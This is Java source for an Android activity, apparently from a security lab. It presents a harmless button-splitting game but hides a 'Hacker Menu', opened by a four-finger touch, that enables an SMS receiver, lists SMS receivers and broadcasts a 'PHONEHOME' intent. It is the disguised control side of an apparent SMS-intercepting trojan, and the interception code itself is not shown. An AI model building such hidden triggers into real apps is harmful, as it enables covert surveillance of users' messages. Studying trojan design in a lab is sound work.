package com.madewithorbit.lab4;

import android.app.ActionBar;
import android.app.Activity;
import android.app.Dialog;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.Toast;

import java.util.HashMap;
import java.util.List;
import java.util.Random;

import static android.view.ViewGroup.LayoutParams;

public class Lab4 extends Activity {

    private boolean debugging = true;

    private HashMap<Integer, GradientDrawable> stageColor = new HashMap<>();

    private View.OnClickListener divider = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            Button b = (Button) v;
            int stage = Integer.parseInt(b.getText().toString());

            LinearLayout l1 = new LinearLayout(Lab4.this);
            LinearLayout.LayoutParams p1 = new LinearLayout.LayoutParams(
                    (stage % 2 == 0) ? 0 : LayoutParams.MATCH_PARENT,
                    (stage % 2 == 0) ? LayoutParams.MATCH_PARENT : 0,
                    1);
            p1.setMargins(0, 0, 0, 0);
            l1.setLayoutParams(p1);
            l1.setOrientation((stage % 2 == 0) ? LinearLayout.VERTICAL : LinearLayout.HORIZONTAL);

            LinearLayout l2 = new LinearLayout(Lab4.this);
            LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(
                    (stage % 2 == 0) ? 0 : LayoutParams.MATCH_PARENT,
                    (stage % 2 == 0) ? LayoutParams.MATCH_PARENT : 0,
                    1);
            p2.setMargins(0, 0, 0, 0);
            l2.setLayoutParams(p2);
            l2.setOrientation((stage % 2 == 0) ? LinearLayout.VERTICAL : LinearLayout.HORIZONTAL);


            LinearLayout parent = (LinearLayout) b.getParent();
            parent.removeView(b);
            parent.addView(l1);
            parent.addView(l2);

            GradientDrawable color;
            if (stageColor.containsKey(stage)) {
                color = stageColor.get(stage);
            } else {
                Random rnd = new Random();
                int c = Color.argb(255, rnd.nextInt(256), rnd.nextInt(256), rnd.nextInt(256));
                color = new GradientDrawable();
                color.setShape(GradientDrawable.RECTANGLE);
                color.setStroke(2, Color.BLACK);
                color.setColor(c);
                stageColor.put(stage, color);
            }

            Button b1 = new Button(Lab4.this);
            b1.setLayoutParams(new LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT));
            b1.setPadding(0, 0, 0, 0);
            b1.setText(Integer.toString(stage + 1));
            b1.setBackgroundDrawable(color);
            l1.addView(b1);


            Button b2 = new Button(Lab4.this);
            b2.setLayoutParams(new LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT));
            b2.setText(Integer.toString(stage + 1));
            b2.setBackgroundDrawable(color);
            l2.addView(b2);

            b1.setOnClickListener(this);
            b2.setOnClickListener(this);
        }
    };

    ComponentName component;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        findViewById(R.id.spark).setOnClickListener(divider);
        component = new ComponentName(this, SMSReceiver.class);

    }


    @Override
    public boolean dispatchTouchEvent(MotionEvent ev) {
        if (debugging && ev.getPointerCount() >= 4)
            showDebugMenu();
        return super.dispatchTouchEvent(ev);
    }

    public void showDebugMenu() {

        debugging = false;
        final Dialog dialog = new Dialog(this);
        dialog.setContentView(R.layout.dialog_debug);
        dialog.setTitle("Hacker Menu");

        // if button is clicked, close the custom dialog
        dialog.setOnDismissListener(new DialogInterface.OnDismissListener() {
            @Override
            public void onDismiss(DialogInterface dialog) {
                debugging = true;
            }
        });

        View.OnClickListener c = new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                switch (v.getId()) {
                    case R.id.start:
                        getPackageManager().setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
                        break;
                    case R.id.end:
                        getPackageManager().setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                        break;
                    case R.id.toop:
                        int status = getPackageManager().getComponentEnabledSetting(component);
                        if (status == PackageManager.COMPONENT_ENABLED_STATE_ENABLED || status == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT) {
                            Toast.makeText(Lab4.this, "receiver is enabled", Toast.LENGTH_SHORT).show();
                        } else if (status == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                            Toast.makeText(Lab4.this, "receiver is disabled", Toast.LENGTH_SHORT).show();
                        }
                        Intent ii = new Intent("android.provider.Telephony.SMS_RECEIVED");
                        sendBroadcast(ii);

                        Intent intent = new Intent("android.provider.Telephony.SMS_RECEIVED");
                        List<ResolveInfo> infos = getPackageManager().queryBroadcastReceivers(intent, 0);
                        for (ResolveInfo info : infos) {
                            System.out.println("Receiver name:" + info.activityInfo.name + "; priority=" + info.priority);
                        }
                        break;
                    case R.id.midnight:
                        Intent iii = new Intent("com.madewithorbit.lab4.smsservice.PHONEHOME");
                        sendBroadcast(iii);
                        break;
                    case R.id.close:
                        dialog.dismiss();
                        debugging = true;
                }
            }
        };
        dialog.findViewById(R.id.start).setOnClickListener(c);
        dialog.findViewById(R.id.end).setOnClickListener(c);
        dialog.findViewById(R.id.toop).setOnClickListener(c);
        dialog.findViewById(R.id.midnight).setOnClickListener(c);
        dialog.findViewById(R.id.close).setOnClickListener(c);


        dialog.show();
    }
}